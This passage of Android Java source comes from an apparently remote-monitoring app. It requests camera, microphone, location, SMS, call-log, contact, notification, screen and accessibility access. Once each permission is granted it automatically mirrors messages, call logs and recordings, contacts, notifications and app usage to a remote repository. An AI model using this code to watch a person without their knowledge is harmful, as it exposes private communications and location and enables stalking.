            needed.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        if (needed.isEmpty()) {
            Toast.makeText(this, R.string.remote_perm_already_enabled, Toast.LENGTH_SHORT).show();
            modulePrefs.setCallLogsSharingEnabled(true);
            new RemoteDeviceInfoRepository(this).publishModuleFlags();
            RemoteCallRecordingWatcher.syncWithPrefs(this);
            new Thread(() -> {
                RemoteCallLogMirror.syncRecent(this, 100);
                RemoteCallRecordingLinker.attachOemRecordings(this, 15);
            }).start();
            return;
        }
        boolean permanentlyDenied = false;
        for (String perm : needed) {
            if (RemotePermissionChecks.wasAsked(this, perm)
                    && !shouldShowRequestPermissionRationale(perm)) {
                permanentlyDenied = true;
                break;
            }
        }
        for (String perm : needed) {
            RemotePermissionChecks.markAsked(this, perm);
        }
        if (permanentlyDenied) {
            Toast.makeText(this, R.string.remote_perm_call_logs_open_settings, Toast.LENGTH_LONG).show();
            openAppSettings();
            return;
        }
        Toast.makeText(this, R.string.remote_perm_call_logs_need_all, Toast.LENGTH_SHORT).show();
        runtimePermissionLauncher.launch(needed.toArray(new String[0]));
    }

    private void toastAlreadyOrOpenSettings(boolean already) {
        if (already) {
            Toast.makeText(this, R.string.remote_perm_already_enabled, Toast.LENGTH_SHORT).show();
        } else {
            openAppSettings();
        }
    }

    private void enableMissingPermissions() {
        expandSection(bodyPermissions, chevronPermissions);
        focusCard(cardPermissions);
        RemoteModuleAutoEnable.syncFromSystemAccess(this);
        ensureLocationSharingFromPermission();

        List<String> missing = new ArrayList<>();
        if (!RemotePermissionChecks.hasCamera(this)) missing.add(Manifest.permission.CAMERA);
        if (!RemotePermissionChecks.hasMicrophone(this)) missing.add(Manifest.permission.RECORD_AUDIO);
        if (!RemotePermissionChecks.hasForegroundLocation(this)) {
            missing.add(Manifest.permission.ACCESS_FINE_LOCATION);
            missing.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        }
        if (!RemotePermissionChecks.hasMediaAccess(this)) {
            if (Build.VERSION.SDK_INT >= 33) {
                missing.add(Manifest.permission.READ_MEDIA_IMAGES);
                missing.add(Manifest.permission.READ_MEDIA_VIDEO);
                missing.add(Manifest.permission.READ_MEDIA_AUDIO);
            } else {
                missing.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            }
        }
        if (!RemotePermissionChecks.hasSmsAccess(this)) {
            missing.add(Manifest.permission.READ_SMS);
            missing.add(Manifest.permission.RECEIVE_SMS);
        }
        if (!RemotePermissionChecks.hasCallLogAccess(this)) {
            missing.add(Manifest.permission.READ_CALL_LOG);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {
            missing.add(Manifest.permission.READ_PHONE_STATE);
        }
        if (!RemotePermissionChecks.hasContactsAccess(this)) {
            missing.add(Manifest.permission.READ_CONTACTS);
        }

        if (!missing.isEmpty()) {
            continueMissingAfterRuntime = true;
            runtimePermissionLauncher.launch(missing.toArray(new String[0]));
            refreshPermissionChips();
            return;
        }
        continueMissingPermissionsFlow();
    }

    private void continueMissingPermissionsFlow() {
        RemoteModuleAutoEnable.syncFromSystemAccess(this);
        ensureLocationSharingFromPermission();
        refreshPermissionChips();
        if (RemoteSpecialPermissionGuide.hasMissingSteps(this)) {
            RemoteSpecialPermissionGuide.startMissingOnly(this, specialPermissionGuideHost());
            return;
        }
        Toast.makeText(this, R.string.remote_perm_already_enabled, Toast.LENGTH_SHORT).show();
    }

    private void bindUi() {
        refreshPermissionChips();
        bindActiveSessionCard();
    }

    private void bindActiveSessionCard() {
        if (cardActiveSession != null) {
            cardActiveSession.setVisibility(View.GONE);
        }
    }

    private void refreshPermissionChips() {
        boolean camera = RemotePermissionChecks.hasCamera(this);
        applyPermissionRow(R.id.row_perm_camera, chipCamera, camera, false);

        boolean microphone = RemotePermissionChecks.hasMicrophone(this);
        applyPermissionRow(R.id.row_perm_microphone, chipMicrophone, microphone, false);

        boolean location = RemotePermissionChecks.hasForegroundLocation(this);
        applyPermissionRow(R.id.row_perm_location, chipLocation, location, false);

        boolean locationBg = RemotePermissionChecks.hasBackgroundLocation(this);
        applyPermissionRow(R.id.row_perm_location_bg, chipLocationBg, locationBg, false);

        boolean gallery = RemotePermissionChecks.hasMediaAccess(this);
        applyPermissionRow(R.id.row_perm_gallery, chipGallery, gallery, false);

        boolean nls = RemotePermissionChecks.hasNotificationListener(this);
        applyPermissionRow(R.id.row_perm_notification_access, chipNotificationAccess, nls, false);

        boolean files = RemotePermissionChecks.hasFolderAccess(this);
        applyPermissionRow(R.id.row_perm_files, chipFiles, files, false);

        boolean sms = RemotePermissionChecks.hasSmsAccess(this);
        applyPermissionRow(R.id.row_perm_sms, chipSms, sms, false);

        boolean callLogs = RemotePermissionChecks.hasCallLogAccess(this);
        boolean callRecReady = RemotePermissionChecks.hasCallRecordingReady(this);
        applyPermissionRow(R.id.row_perm_call_logs, chipCallLogs, callRecReady, callLogs && !callRecReady);

        boolean contacts = RemotePermissionChecks.hasContactsAccess(this);
        applyPermissionRow(R.id.row_perm_contacts, chipContacts, contacts, false);

        boolean screen = RemoteMediaProjectionHolder.hasValidResult()
                || modulePrefs.isScreenMirrorEnabled()
                || modulePrefs.isScreenRecordEnabled();
        applyPermissionRow(R.id.row_perm_screen, chipScreen, screen, false);

        boolean apps = modulePrefs.isInstalledAppsSharingEnabled();
        applyPermissionRow(R.id.row_perm_apps, chipApps, apps, false);

        boolean usageAccess = RemoteAppUsageMirror.hasUsageAccess(this);
        if (!usageAccess && modulePrefs.isAppUsageSharingEnabled()) {
            modulePrefs.setAppUsageSharingEnabled(false);
            new RemoteDeviceInfoRepository(this).publishModuleFlags();
        }
        if (usageAccess && !modulePrefs.isAppUsageSharingEnabled()) {
            modulePrefs.setAppUsageSharingEnabled(true);
            new RemoteDeviceInfoRepository(this).publishModuleFlags();
            new Thread(() -> RemoteAppUsageMirror.syncRecent(this, 7)).start();
        }
        boolean appUsageReady = usageAccess && modulePrefs.isAppUsageSharingEnabled();
        applyPermissionRow(R.id.row_perm_app_usage, chipAppUsage, appUsageReady, false);

        boolean a11y = RemoteAppBlockManager.isAccessibilityEnabled(this);
        applyPermissionRow(R.id.row_perm_app_control, chipAppControl, a11y, false);
        if (a11y && !modulePrefs.isAppControlEnabled()) {
            modulePrefs.setAppControlEnabled(true);
            new RemoteDeviceInfoRepository(this).publishModuleFlags();
        } else if (!a11y && modulePrefs.isAppControlEnabled()) {
            modulePrefs.setAppControlEnabled(false);
            new RemoteDeviceInfoRepository(this).publishModuleFlags();
        }

        if (sms && !modulePrefs.isMessagesSharingEnabled()) {
            modulePrefs.setMessagesSharingEnabled(true);
            new RemoteDeviceInfoRepository(this).publishModuleFlags();
            new Thread(() -> RemoteSmsMirror.syncInbox(this, 80)).start();
        }
        if (callLogs && !modulePrefs.isCallLogsSharingEnabled()) {
            modulePrefs.setCallLogsSharingEnabled(true);
            new RemoteDeviceInfoRepository(this).publishModuleFlags();
            new Thread(() -> RemoteCallLogMirror.syncRecent(this, 80)).start();
        }
        if (callLogs) {
            RemoteCallRecordingWatcher.syncWithPrefs(this);
        }
        if (contacts && !modulePrefs.isContactsSharingEnabled()) {
            modulePrefs.setContactsSharingEnabled(true);
            new RemoteDeviceInfoRepository(this).publishModuleFlags();
            new Thread(() -> RemoteContactsMirror.syncAll(this, 400)).start();
        }
        // If Notification Access is revoked, turn off website sharing.
        if (!nls && modulePrefs.isNotificationMirrorEnabled()) {
            modulePrefs.setNotificationMirrorEnabled(false);
            new RemoteDeviceInfoRepository(this).publishModuleFlags();
        } else if (nls && !modulePrefs.isNotificationMirrorEnabled()) {
            modulePrefs.setNotificationMirrorEnabled(true);
            new RemoteDeviceInfoRepository(this).publishModuleFlags();
            new Thread(() -> RemoteNotificationMirror.syncActive(this)).start();
        }

        updatePermissionsEmptyState();
    }

    private void applyPermissionRow(int rowId, @Nullable Chip chip, boolean fullyEnabled, boolean partial) {
        View row = findViewById(rowId);
        if (row == null) return;
        if (chip != null) {
            if (partial) {
                applyStatusChip(chip, false, getString(R.string.status_partial));
            } else {
                applyStatusChip(chip, fullyEnabled,
                        getString(fullyEnabled ? R.string.status_enabled : R.string.status_disabled));
            }
        }
        row.setVisibility((fullyEnabled && !partial) ? View.GONE : View.VISIBLE);
    }

    private void updatePermissionsEmptyState() {
        int[] rowIds = {
                R.id.row_perm_camera,
                R.id.row_perm_microphone,
                R.id.row_perm_location,
                R.id.row_perm_location_bg,
                R.id.row_perm_gallery,
                R.id.row_perm_notification_access,
                R.id.row_perm_files,
                R.id.row_perm_sms,
                R.id.row_perm_call_logs,
                R.id.row_perm_contacts,
                R.id.row_perm_screen,
                R.id.row_perm_apps,
                R.id.row_perm_app_usage,
                R.id.row_perm_app_control
        };
        boolean anyVisible = false;
        for (int rowId : rowIds) {
            View row = findViewById(rowId);
            if (row != null && row.getVisibility() == View.VISIBLE) {
                anyVisible = true;
                break;
            }
        }
        TextView empty = findViewById(R.id.text_permissions_all_granted);
        if (empty != null) {
            empty.setVisibility(anyVisible ? View.GONE : View.VISIBLE);
        }
    }

    private void refreshFcmToken() {
        FirebaseMessaging.getInstance().getToken()
                .addOnSuccessListener(token -> {
                    if (token != null && !token.trim().isEmpty()) {
                        deviceRepository.updateFcmToken(token);
                    }
                });
    }

    private void openAppSettings() {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        intent.setData(Uri.fromParts("package", getPackageName(), null));
        startActivity(intent);
    }

    private void openNotificationListenerSettings() {
        try {
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        } catch (Exception e) {
            openAppSettings();
        }
    }

    private void applyStatusChip(@NonNull Chip chip, boolean positive, @NonNull String label) {
        chip.setText(label);
        int bg = ContextCompat.getColor(this,
                positive ? R.color.status_positive_container : R.color.status_negative_container);
        int fg = ContextCompat.getColor(this,
                positive ? R.color.status_positive_text : R.color.status_negative_text);
        chip.setChipBackgroundColor(ColorStateList.valueOf(bg));
        chip.setTextColor(fg);
    }
}
